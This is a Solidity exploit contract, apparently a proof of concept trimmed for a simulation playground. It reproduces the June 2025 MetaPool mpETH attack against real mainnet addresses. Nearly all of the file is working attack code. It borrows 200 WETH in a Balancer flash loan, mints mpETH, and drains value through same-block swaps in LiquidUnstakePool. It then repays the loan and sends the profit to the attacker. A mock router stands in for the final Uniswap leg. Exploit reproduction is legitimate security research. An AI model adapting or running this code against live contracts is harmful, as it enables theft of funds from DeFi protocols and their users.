// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Playground-trimmed MetaPool exploit (June 2025).
//
// Historical PoC ends with Uniswap V3 exactInputSingle on the residual 10 mpETH
// — that leg alone is millions of opcodes and OOMs the browser. The CORE bug is
// same-block mint→swapmpETHforETH priced from convertToAssets with no holding
// period (LiquidUnstakePool).
//
// This synthetic keeps the historical 200 WETH flash + 107 ETH deposit + mint +
// two MetaPool pool swaps, and routes the 10-ether remainder through a MINI
// SwapRouter installed via codeOverrides at the real SwapRouter02 address.
// The mini router just transferFrom's mpETH and pays WETH 1:1 (seeded in setup),
// preserving profit > 0 and the vulnerability locator on LiquidUnstakePool
// without the real Uniswap V3 math.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IMpEth is IERC20 {
    function depositETH(address receiver) external payable returns (uint256);
    function mint(uint256 shares, address receiver) external;
}

interface IMpEthPool {
    function swapmpETHforETH(uint256 amount, uint256 minAmountOut) external;
}

interface IV3SwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256);
}

address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant MPETH_ADDR = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
address constant MPETH_TO_ETH_POOL = 0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc;
address constant UNISWAP_V3_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;

/// @dev Cheap stand-in for SwapRouter02.exactInputSingle — 1:1 tokenIn→tokenOut.
/// Installed via codeOverrides at UNISWAP_V3_ROUTER. Setup seeds WETH on this
/// address so the remainder leg can pay out without real V3 math.
contract MiniSwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
        // Pull input (mpETH) from the caller.
        require(IERC20(params.tokenIn).transferFrom(msg.sender, address(this), params.amountIn), "in");
        // Pay 1:1 in tokenOut (WETH) — historical V3 returned ~0.9999 WETH per mpETH.
        amountOut = params.amountIn;
        require(amountOut >= params.amountOutMinimum, "slip");
        require(IERC20(params.tokenOut).transfer(params.recipient, amountOut), "out");
    }
}

contract MetaPoolExploit {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function start() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_ADDR;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory, /* tokens */
        uint256[] memory amounts,
        uint256[] memory, /* feeAmounts */
        bytes memory /* data */
    ) public {
        IWETH weth = IWETH(payable(WETH_ADDR));
        IMpEth mpEth = IMpEth(MPETH_ADDR);
        IMpEthPool mpEthPool = IMpEthPool(MPETH_TO_ETH_POOL);
        IV3SwapRouter v3SwapRouter = IV3SwapRouter(UNISWAP_V3_ROUTER);

        // Step 1–3: historical deposit + mint (mint needs the ~107 ETH path).
        weth.withdraw(107 ether);
        uint256 amount = mpEth.depositETH{value: 107 ether}(address(this));
        mpEth.mint(amount, address(this));

        // Step 4: MetaPool pool swaps (the vulnerable path).
        mpEth.approve(MPETH_TO_ETH_POOL, type(uint256).max);
        mpEthPool.swapmpETHforETH(97 ether, 0);
        mpEthPool.swapmpETHforETH(9.6 ether, 0);

        // Step 5: remainder via mini V3 router (codeOverrides) — cheap 1:1.
        mpEth.approve(UNISWAP_V3_ROUTER, 1_000_000_000 ether);
        IV3SwapRouter.ExactInputSingleParams memory _params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: MPETH_ADDR,
            tokenOut: WETH_ADDR,
            fee: 100,
            recipient: address(this),
            amountIn: 10 ether,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        v3SwapRouter.exactInputSingle(_params);

        // Step 6–9: wrap, repay, forward profit.
        uint256 ethBalance = address(this).balance;
        weth.deposit{value: ethBalance}();
        weth.transfer(BALANCER_VAULT, amounts[0]);

        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance > 0) {
            weth.withdraw(wethBalance);
        }
        ethBalance = address(this).balance;
        if (ethBalance > 0) {
            (bool ok,) = payable(attacker).call{value: ethBalance}("");
            require(ok, "eth xfer");
        }
        uint256 mpLeft = mpEth.balanceOf(address(this));
        if (mpLeft > 0) {
            mpEth.transfer(attacker, mpLeft);
        }
    }

    receive() external payable {}
}
